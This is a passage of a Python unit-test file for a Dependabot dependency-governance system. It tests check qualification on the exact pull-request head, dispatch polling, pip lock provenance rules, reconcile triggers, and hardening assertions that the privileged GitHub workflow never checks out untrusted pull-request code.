                for index, requirement in enumerate(CONFIG["requiredWorkflows"], start=80):
                    self.runs.append(
                        {
                            "id": index,
                            "name": requirement["workflow"],
                            "path": f".github/workflows/{requirement['file']}",
                            "event": "pull_request",
                            "head_sha": head,
                            "head_branch": pull["head"]["ref"],
                            "pull_requests": [{"number": pull["number"]}],
                            "actor": {
                                "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                                "id": CONFIG["trustedWorkflowDispatchActorUserId"],
                            },
                            "triggering_actor": {
                                "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                                "id": CONFIG["trustedWorkflowDispatchActorUserId"],
                            },
                            "status": "completed",
                            "conclusion": "success",
                            "updated_at": f"2026-09-02T12:02:{index:02d}Z",
                        }
                    )
                    self.jobs[index] = [
                        {
                            "name": requirement["gate"],
                            "status": "completed",
                            "conclusion": "success",
                        }
                    ]

            def get(self, path: str) -> dict:
                if path == f"/pulls/{pull['number']}":
                    return pull
                if path.startswith("/git/ref/heads/"):
                    return {"object": {"sha": base}}
                raise AssertionError(path)

            def paginate(self, path: str, selector: str | None = None) -> list[dict]:
                if path.startswith("/actions/runs?"):
                    return list(self.runs)
                match = re.fullmatch(r"/actions/runs/(\d+)/jobs", path)
                if match:
                    return list(self.jobs[int(match.group(1))])
                raise AssertionError(path)

        api = NativeApi()
        with patch("dependency_governance.assess_pull", return_value=assessment):
            result = wait_for_exact_head_native_required_checks(
                api,
                assessment,
                CONFIG,
                [{"workflow": "ci", "state": "approval-requested", "runId": 80}],
                sleep_fn=lambda _: None,
                poll_attempts=1,
                poll_interval_seconds=0,
            )
        self.assertTrue(result.qualification["allSuccess"])
        self.assertTrue(
            result.qualification["nativePullQualification"]["allSuccess"]
        )

    def test_requested_dispatches_are_waited_for_until_exact_head_success(self) -> None:
        base, head, pull, commit = canonical_fixture()
        pending = Assessment(
            pull=pull,
            base_sha=base,
            files=[{"filename": "requirements.txt"}],
            ecosystem="pip",
            provenance={"eligible": True, "reasons": [], "commit": commit},
            metadata={"eligible": True, "reasons": [], "metadata": []},
            semantic={"eligible": True, "reasons": [], "changes": []},
            qualification={"allSuccess": False, "anyFailed": True, "qualifications": []},
        )
        still_pending = Assessment(
            pull=pull,
            base_sha=base,
            files=pending.files,
            ecosystem=pending.ecosystem,
            provenance=pending.provenance,
            metadata=pending.metadata,
            semantic=pending.semantic,
            qualification={"allSuccess": False, "anyFailed": False, "qualifications": []},
        )
        success = Assessment(
            pull=pull,
            base_sha=base,
            files=pending.files,
            ecosystem=pending.ecosystem,
            provenance=pending.provenance,
            metadata=pending.metadata,
            semantic=pending.semantic,
            qualification={"allSuccess": True, "anyFailed": False, "qualifications": []},
        )
        sleeps: list[float] = []
        with patch(
            "dependency_governance.assess_pull",
            side_effect=[still_pending, success],
        ) as reassess:
            result = wait_for_exact_head_qualification_dispatches(
                object(),
                pending,
                CONFIG,
                [{"file": "ci.yml", "state": "requested"}],
                sleep_fn=sleeps.append,
                poll_attempts=3,
                poll_interval_seconds=0.25,
            )
        self.assertIs(result, success)
        self.assertEqual(sleeps, [0.25, 0.25])
        self.assertEqual(reassess.call_count, 2)
        self.assertEqual((result.pull["head"] or {})["sha"], head)

    def test_published_pip_provenance_accepts_only_safe_collapsed_pr_paths(self) -> None:
        base, source_sha, pull, source = canonical_fixture()
        publisher_sha = "c" * 40
        pull = {
            **pull,
            "commits": 2,
            "changed_files": 2,
            "head": {
                **pull["head"],
                "ref": "dependabot/pip/pytest-rerunfailures",
                "sha": publisher_sha,
            },
        }
        commits = [source, {"sha": publisher_sha}]

        class PublishedApi:
            def get(self, path: str) -> dict:
                if path == f"/commits/{source_sha}":
                    return source
                raise AssertionError(path)

        scope = {
            "eligible": True,
            "reasons": [],
            "provenanceState": "dependabot-plus-trusted-lock-publisher",
            "sourceCommit": source_sha,
        }
        with patch("dependency_recovery.assess_recovery_scope", return_value=scope):
            accepted = published_pip_provenance(
                PublishedApi(),
                pull,
                [
                    {"filename": "requirements.txt"},
                    {"filename": "requirements-lock/manifest.json"},
                ],
                commits,
                base,
                CONFIG,
            )
            self.assertIsNotNone(accepted)
            assert accepted is not None
            self.assertTrue(accepted["eligible"], accepted["reasons"])

            self.assertIsNone(
                published_pip_provenance(
                    PublishedApi(),
                    pull,
                    [{"filename": "requirements-lock/manifest.json"}],
                    commits,
                    base,
                    CONFIG,
                )
            )
            self.assertIsNone(
                published_pip_provenance(
                    PublishedApi(),
                    pull,
                    [
                        {"filename": "requirements.txt"},
                        {"filename": "pyproject.toml"},
                    ],
                    commits,
                    base,
                    CONFIG,
                )
            )

    def test_dispatch_wait_fails_closed_on_subject_drift(self) -> None:
        base, _, pull, commit = canonical_fixture()
        pending = Assessment(
            pull=pull,
            base_sha=base,
            files=[{"filename": "requirements.txt"}],
            ecosystem="pip",
            provenance={"eligible": True, "reasons": [], "commit": commit},
            metadata={"eligible": True, "reasons": [], "metadata": []},
            semantic={"eligible": True, "reasons": [], "changes": []},
            qualification={"allSuccess": False, "anyFailed": False, "qualifications": []},
        )
        moved_pull = {**pull, "head": {**pull["head"], "sha": "c" * 40}}
        moved = Assessment(
            pull=moved_pull,
            base_sha=base,
            files=pending.files,
            ecosystem=pending.ecosystem,
            provenance=pending.provenance,
            metadata=pending.metadata,
            semantic=pending.semantic,
            qualification={"allSuccess": True, "anyFailed": False, "qualifications": []},
        )
        sleeps: list[float] = []
        with patch("dependency_governance.assess_pull", return_value=moved) as reassess:
            result = wait_for_exact_head_qualification_dispatches(
                object(),
                pending,
                CONFIG,
                [{"file": "ci.yml", "state": "requested"}],
                sleep_fn=sleeps.append,
                poll_attempts=4,
                poll_interval_seconds=0.1,
            )
        self.assertIs(result, pending)
        self.assertEqual(sleeps, [0.1])
        self.assertEqual(reassess.call_count, 1)

    def test_completed_dispatches_do_not_add_wait_latency(self) -> None:
        base, _, pull, commit = canonical_fixture()
        assessment = Assessment(
            pull=pull,
            base_sha=base,
            files=[{"filename": "requirements.txt"}],
            ecosystem="pip",
            provenance={"eligible": True, "reasons": [], "commit": commit},
            metadata={"eligible": True, "reasons": [], "metadata": []},
            semantic={"eligible": True, "reasons": [], "changes": []},
            qualification={"allSuccess": True, "anyFailed": False, "qualifications": []},
        )
        sleeps: list[float] = []
        result = wait_for_exact_head_qualification_dispatches(
            object(),
            assessment,
            CONFIG,
            [{"file": "ci.yml", "state": "existing-success"}],
            sleep_fn=sleeps.append,
            poll_attempts=1,
            poll_interval_seconds=0,
        )
        self.assertIs(result, assessment)
        self.assertEqual(sleeps, [])

    def test_publisher_completion_is_trusted_bulk_reconcile_wake(self) -> None:
        event = {
            "workflow_run": {
                "name": "dependency-lock-publisher",
                "path": ".github/workflows/dependency-lock-publisher.yml",
                "event": "workflow_run",
                "status": "completed",
                "head_branch": CONFIG["baseBranch"],
                "pull_requests": [],
            }
        }
        self.assertTrue(should_bulk_reconcile(event, "workflow_run", CONFIG))
        for mutation in (
            {"name": "dependency-locks"},
            {"path": ".github/workflows/fake.yml"},
            {"event": "push"},
            {"status": "in_progress"},
            {"head_branch": "feature/untrusted"},
        ):
            changed = json.loads(json.dumps(event))
            changed["workflow_run"].update(mutation)
            self.assertFalse(should_bulk_reconcile(changed, "workflow_run", CONFIG))
        self.assertTrue(should_bulk_reconcile({}, "schedule", CONFIG))
        self.assertTrue(should_bulk_reconcile({}, "push", CONFIG))
        self.assertFalse(should_bulk_reconcile(event, "pull_request_target", CONFIG))

    def test_manual_dispatch_input_is_strict(self) -> None:
        self.assertEqual(
            event_pull_number({"inputs": {"pr-number": "54"}}, "workflow_dispatch"), 54
        )
        for bad in ("0", "-1", "1.2", "nope"):
            with self.assertRaises(GovernanceError):
                event_pull_number({"inputs": {"pr-number": bad}}, "workflow_dispatch")

    def test_schedule_reconciliation_isolates_failures(self) -> None:
        pulls = [{"number": 1}, {"number": 2}, {"number": 3}]
        visited: list[int] = []

        def processor(pull: dict) -> str:
            visited.append(pull["number"])
            if pull["number"] == 2:
                raise RuntimeError("boom")
            return "ok"

        results, failures = reconcile_independently(pulls, processor)
        self.assertEqual(visited, [1, 2, 3])
        self.assertEqual([number for number, _ in results], [1, 3])
        self.assertEqual(failures, [(2, "boom")])

    def test_comment_documents_safety_boundary(self) -> None:
        base, _, pull, commit = canonical_fixture()
        assessment = Assessment(
            pull=pull,
            base_sha=base,
            files=[{"filename": "requirements.txt"}],
            ecosystem="pip",
            provenance={"eligible": True, "reasons": [], "commit": commit},
            metadata={"eligible": True, "reasons": [], "metadata": []},
            semantic=validate_pip_manual(CONFIG),
            qualification={
                "allSuccess": False,
                "anyFailed": False,
                "qualifications": [
                    {**item, "state": "not-evaluated", "runId": None}
                    for item in CONFIG["requiredWorkflows"]
                ],
            },
        )
        body = render_comment(assessment, CONFIG)
        self.assertIn("never regenerates Python locks", body)
        self.assertIn("MANUAL / WAIT", body)

    def test_privileged_workflow_never_checks_out_dependabot_head(self) -> None:
        workflow = (
            ROOT / ".github" / "workflows" / "dependency-governance.yml"
        ).read_text(encoding="utf-8")
        self.assertIn("push:", workflow)
        self.assertIn("branches: [main]", workflow)
        self.assertIn("pull_request_target:", workflow)
        self.assertIn("workflow_run:", workflow)
        self.assertIn("workflows: [ci, extended, security, docs, dependency-locks, dependency-lock-publisher]", workflow)
        self.assertIn("schedule:", workflow)
        self.assertIn("cron: '17 * * * *'", workflow)
        self.assertIn("ref: ${{ github.event.repository.default_branch }}", workflow)
        self.assertIn("persist-credentials: false", workflow)
        self.assertNotRegex(workflow, r"ref:\s*\$\{\{\s*github\.event\.pull_request\.head")
        self.assertNotRegex(workflow, r"ref:\s*\$\{\{\s*github\.event\.workflow_run\.head_sha")
        self.assertIn(
            "group: dependency-governance-${{ github.event_name == 'pull_request' && github.event.pull_request.head.ref || github.event_name == 'workflow_run' && github.event.workflow_run.name == 'dependency-lock-publisher' && 'publisher-reconcile' || 'reconcile' }}",
            workflow,
        )
        self.assertIn("'publisher-reconcile'", workflow)
        self.assertIn("cancel-in-progress: false", workflow)
        self.assertIn("DEPENDABOT_OWNER_TOKEN: ${{ secrets.DEPENDABOT_OWNER_TOKEN }}", workflow)
        self.assertIn("timeout-minutes: 30", workflow)
        self.assertIn("github.event_name == 'push'", workflow)
        security = (ROOT / ".github" / "workflows" / "security.yml").read_text(
            encoding="utf-8"
        )
        self.assertIn("governance-base-sha:", security)
        self.assertIn("governance-head-sha:", security)
        self.assertIn(
            "base-ref: ${{ github.event.pull_request.base.sha || inputs.governance-base-sha }}",
            security,
        )
        self.assertIn(
            "head-ref: ${{ github.event.pull_request.head.sha || inputs.governance-head-sha }}",
            security,
        )


if __name__ == "__main__":
    unittest.main(verbosity=2)
